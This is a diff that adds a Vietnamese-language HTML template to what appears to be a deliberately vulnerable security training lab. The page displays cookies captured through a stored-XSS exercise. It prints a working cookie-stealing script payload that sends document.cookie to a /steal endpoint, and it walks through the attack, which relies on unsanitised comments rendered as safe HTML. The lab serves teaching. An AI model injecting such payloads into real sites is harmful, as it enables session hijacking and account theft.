@@ -1,0 +1,78 @@
+{% extends "base.html" %}
+{% block title %}XSS Cookie Log — Shield-Webapp.Lab{% endblock %}
+{% block content %}
+<div class="container">
+  <div class="page-header fade-in">
+    <div class="breadcrumb">Home / XSS Log</div>
+    <h1>🍪 Stolen Cookies</h1>
+    <p>
+      <span class="vuln-tag xss">L3 · Stored XSS</span>
+      &nbsp; Cookies được đánh cắp bởi XSS payload via <code>/steal?c=</code>
+    </p>
+  </div>
+
+  {% if stolen %}
+  <div class="alert alert-danger fade-in">
+    <span>🚨</span>
+    <div>
+      <strong>{{ stolen|length }} cookie(s) đã bị đánh cắp!</strong>
+      Đây là bằng chứng thực tế rằng XSS payload đã chạy trong browser của nạn nhân.
+    </div>
+  </div>
+
+  {% for entry in stolen|reverse %}
+  <div class="card fade-in" style="margin-bottom:16px;border-color:#ffd60044;">
+    <div class="card-header">
+      <div class="card-icon yellow">🍪</div>
+      <div>
+        <div class="card-title">Cookie #{{ loop.index }}</div>
+        <div class="card-subtitle">From: {{ entry.from_ip }} · {{ entry.timestamp }}</div>
+      </div>
+    </div>
+    <div class="ssrf-response" style="border-color:#ffd60066;color:var(--accent-yellow);">{{ entry.cookie or '(empty cookie)' }}</div>
+    <div style="margin-top:12px;font-size:0.8rem;color:var(--text-muted);">
+      ℹ️ Payload: <code>&lt;script&gt;fetch("/steal?c="+document.cookie)&lt;/script&gt;</code>
+    </div>
+  </div>
+  {% endfor %}
+
+  {% else %}
+  <div class="card fade-in" style="text-align:center;padding:48px;">
+    <div style="font-size:3rem;margin-bottom:16px;">🍪</div>
+    <h3 style="color:var(--text-secondary);font-size:1rem;">Chưa có cookie nào bị đánh cắp</h3>
+    <p style="color:var(--text-muted);font-size:0.85rem;margin-top:8px;">
+      Hãy vào <a href="{{ url_for('comments') }}">/comments</a> và inject XSS payload trước.
+    </p>
+    <a href="{{ url_for('comments') }}" class="btn btn-danger" style="margin-top:16px;">
+      💉 Đến Lab XSS
+    </a>
+  </div>
+  {% endif %}
+
+  <!-- How it works -->
+  <div class="card fade-in" style="margin-top:28px;">
+    <div class="card-header">
+      <div class="card-icon green">🛡️</div>
+      <div>
+        <div class="card-title">Cách tấn công XSS hoạt động</div>
+      </div>
+    </div>
+    <div class="terminal">
+<span class="prompt">1. Attacker POST comment với payload:</span>
+<span class="highlight">   &lt;script&gt;fetch("/steal?c="+document.cookie)&lt;/script&gt;</span>
+<br/>
+<span class="prompt">2. Comment được lưu RAW vào DB (không sanitize)</span>
+<span class="output">   INSERT INTO comments VALUES(..., "&lt;script&gt;fetch(...)&lt;/script&gt;")</span>
+<br/>
+<span class="prompt">3. Victim mở trang /comments</span>
+<span class="output">   Browser render: {{ '{{ c.content|safe }}' }} → executes script</span>
+<br/>
+<span class="prompt">4. Script chạy trong browser victim:</span>
+<span class="highlight">   fetch("/steal?c=session=abc123; role=user")</span>
+<br/>
+<span class="prompt">5. Server nhận cookie tại /steal:</span>
+<span class="cmd">   [L3-XSS-COOKIE-STOLEN] cookie=session=abc123...</span>
+    </div>
+  </div>
+</div>
+{% endblock %}
